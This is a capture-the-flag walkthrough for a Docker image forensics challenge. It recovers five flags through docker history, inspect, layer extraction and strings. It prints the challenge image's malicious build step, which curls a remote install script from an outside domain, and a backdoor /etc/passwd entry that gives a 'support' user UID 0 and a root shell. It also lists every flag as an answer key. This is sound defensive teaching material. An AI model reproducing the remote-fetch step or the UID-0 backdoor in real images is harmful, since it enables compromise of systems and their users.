# Image Forensics — Walkthrough

**Author:** 7ankalis — Securinets ENIT
**Flags:** 5

## Setup

    docker pull sitaha/sysdiag:3.1.2

Do not run the image. Analyze it statically.

## Flag 1 — Malicious RUN command

    docker history --no-trunc sitaha/sysdiag:3.1.2

Look for the layer that fetches a remote script:

    RUN /bin/sh -c curl -s "https://metrics-collect.xyz/install.sh?token=SecurinetsENIT{curl_p1p3_4bu53}" -o /tmp/install.sh || true

    SecurinetsENIT{curl_p1p3_4bu53}

## Flag 2 — Image label

    docker inspect sitaha/sysdiag:3.1.2 --format '{{json .Config.Labels}}' | jq

Look at the revision label:

    "org.opencontainers.image.revision": "e5d4c3b2a1-2026-10-05-SecurinetsENIT{r3v1510n_fl4g}"

    SecurinetsENIT{r3v1510n_fl4g}

## Extract the image

    docker save sitaha/sysdiag:3.1.2 -o /tmp/sysdiag.tar
    mkdir /tmp/sysdiag && tar xf /tmp/sysdiag.tar -C /tmp/sysdiag
    cd /tmp/sysdiag

The image is an OCI-format tarball. Layers are stored as
`blobs/sha256/<hash>` files. Each one is a tar of filesystem changes.

## Flag 3 — A deleted file

    for blob in blobs/sha256/*; do
        if tar tf "$blob" 2>/dev/null | grep -q "etc/backup/notes.txt"; then
            tar xfO "$blob" etc/backup/notes.txt
        fi
    done

Output:

    Backup notes for sysdiag
    Run: diag report
    SecurinetsENIT{d3l373d_l4y3r5_r3v34l_4ll}

    SecurinetsENIT{d3l373d_l4y3r5_r3v34l_4ll}

## Flag 4 — Backdoor user

    for blob in blobs/sha256/*; do
        if tar tf "$blob" 2>/dev/null | grep -qE "(^|/)etc/passwd$"; then
            tar xfO "$blob" etc/passwd 2>/dev/null | grep support
        fi
    done

Output:

    support:x:0:0:SecurinetsENIT{b4ckd00r_u53r_p4sswd}:/root:/bin/bash

    SecurinetsENIT{b4ckd00r_u53r_p4sswd}

## Flag 5 — Binary strings

    for blob in blobs/sha256/*; do
        if tar tf "$blob" 2>/dev/null | grep -q "usr/local/bin/diag"; then
            tar xfO "$blob" usr/local/bin/diag > /tmp/diag
        fi
    done

    strings /tmp/diag | grep Securinets

Output:

    SecurinetsENIT{5tr1ng5_1n_b1n4ry_n3v3r_l13}

    SecurinetsENIT{5tr1ng5_1n_b1n4ry_n3v3r_l13}

## Summary

| # | Flag | Where |
|---|---|---|
| 1 | SecurinetsENIT{curl_p1p3_4bu53} | docker history RUN command |
| 2 | SecurinetsENIT{r3v1510n_fl4g} | Image label revision |
| 3 | SecurinetsENIT{d3l373d_l4y3r5_r3v34l_4ll} | Deleted file in a layer blob |
| 4 | SecurinetsENIT{b4ckd00r_u53r_p4sswd} | /etc/passwd GECOS field |
| 5 | SecurinetsENIT{5tr1ng5_1n_b1n4ry_n3v3r_l13} | strings on diag binary |

## What the player learns

- docker history shows every build command
- docker inspect shows labels, env, and config
- docker save reveals the image as a stack of layer blobs
- "Deleted" files are still in earlier layers
- Binaries contain compile-time strings
- Static analysis is the right first step before running untrusted images
